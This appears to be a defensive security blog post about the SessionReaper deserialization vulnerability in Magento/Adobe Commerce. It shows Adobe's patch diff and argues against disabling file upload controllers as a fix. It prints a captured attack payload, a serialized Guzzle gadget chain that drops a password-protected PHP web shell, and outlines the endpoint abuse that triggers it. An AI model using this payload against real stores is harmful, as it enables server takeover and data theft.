---
layout: blog-single
title:  "Shutting Down File Upload Controllers for SessionReaper is futile"
date: October 29, 2025
image: 
tags: [Security, Magento, Adobe Commerce]
related_posts:
---

Since Searchlight Cyber published [a technical write up and proof-of-concept for the SessionReaper vulnerability](https://slcyber.io/assetnote-security-research-center/why-nested-deserialization-is-still-harmful-magento-rce-cve-2025-54236/), attackers have been mass scanning Magento / Adobe Commerce stores for vulnerable targets. The first phase of the attack involves uploading a payload containing malicious session data to the server.

```
$ cat pub/media/customer_address/s/e/sess_aly4jr1awshxasfgwwboqeiqn3
_|O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{S:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{S:4:"data";a:3:{S:7:"Expires";i:1;S:7:"Discard";b:0;S:5:"Value";S:161:"<?php if (!hash_equals('4009d3fa8132195a2dab4dfa3affc8d2', md5(md5($_REQUEST['pass'] ?? '')))) { header('Location:404.php'); exit; } system($_REQUEST['cmd']); ?>";}}}S:10:"strictMode";N;S:8:"filename";S:16:"./errors/503.php";S:19:"storeSessionCookies";b:1;}
```
{:.wrap} 

Next, the attacker sends a request to the `/rest/default/V1/guest-carts/:cartId/order` endpoint, manipulating the `savePath` property of the `sessionConfig` object such that the malicious session will be initialized.

To protect against this vulnerability it is critical to apply Adobe's patch which adds validation to the API request handling to control which types of objects can be created, preventing manipulation of the `sessionConfig`.

<!-- excerpt_separator -->

```
diff --git a/vendor/magento/framework/Webapi/ServiceInputProcessor.php b/vendor/magento/framework/Webapi/ServiceInputProcessor.php
index ba58dc2bc7acf..06919af36d2eb 100644
--- a/vendor/magento/framework/Webapi/ServiceInputProcessor.php
+++ b/vendor/magento/framework/Webapi/ServiceInputProcessor.php
@@ -246,6 +246,13 @@ private function getConstructorData(string $className, array $data): array
             if (isset($data[$parameter->getName()])) {
                 $parameterType = $this->typeProcessor->getParamType($parameter);

+                // Allow only simple types or Api Data Objects
+                if (!($this->typeProcessor->isTypeSimple($parameterType)
+                    || preg_match('~\\\\?\w+\\\\\w+\\\\Api\\\\Data\\\\~', $parameterType) === 1
+                )) {
+                    continue;
+                }
+
                 try {
                     $res[$parameter->getName()] = $this->convertValue($data[$parameter->getName()], $parameterType);
                 } catch (\ReflectionException $e) {
```

However, implementing this patch alone does not stop an attacker from performing phase 1 of the attack and uploading the malicious session files. 

I have noticed a lot of discussion about this, with some recommending patching the `Magento\Customer\Controller\Address\File\Upload` class to immediately bail and not run at all.

While I can understand this inclination, it ultimately is the wrong solution to the problem. It is expected that frontend users are able to upload files to the server for some uses cases (as is common functionality with many web applications). In the core Adobe Commerce codebase (not Magento Open Source) there are 3 other frontend controllers that accept file uploads. It is very common functionality in 3rd party extensions such [swissuplabs Order Attachments](https://docs.swissuplabs.com/m2/extensions/order-attachments/).

Ultimately, applying the Adobe patch to prevent abuse is the best solution to the issue. Beyond that, additional validation to the contents of a proposed file upload (for example searching for signatures indicative of malware such as an opening PHP tag) could help prevent these types of uploads from making it to your server. 
